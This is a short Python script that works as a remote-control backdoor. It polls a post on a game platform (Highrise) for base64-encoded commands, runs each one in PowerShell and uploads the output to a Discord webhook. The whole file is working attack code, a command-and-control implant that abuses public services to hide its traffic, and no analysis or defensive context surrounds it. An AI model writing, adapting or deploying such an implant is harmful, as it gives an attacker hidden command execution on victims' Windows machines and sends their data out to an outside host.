import requests,json,subprocess,time,os,base64,sys

previous_cmd = None
hr_post_url = "https://webapi.highrise.game/posts/<post_id>"
dc_webhook_url = 'https://discord.com/api/webhooks/<web_hook>'

while True:
    response = requests.get(hr_post_url)
    data = response.json()
    cmd = data['post']['body']['text']
        
    if cmd != previous_cmd:
        encoded_output = cmd
        sys.stdout.write(f"[+] Got encoded CMD: {encoded_output}\n")
        
        decoded_output = base64.b64decode(encoded_output).decode('utf-8')
        sys.stdout.write(f"[+] Executing decoded CMD: {decoded_output}\n\n")
        
        process = subprocess.run(['powershell', '-Command', decoded_output], capture_output=True, text=True)
       
        data = f"{process.stdout}"
        
        temp_file_name = 'temp_message.txt'
        with open(temp_file_name, 'w') as file:
            file.write(data)
            
        file = {'file': (temp_file_name, open(temp_file_name, 'rb'))}

        data = json.dumps(data)

        response = requests.post(dc_webhook_url, files=file)
        
        file['file'][1].close()
        os.remove(temp_file_name)
        
    previous_cmd = cmd
    time.sleep(1)
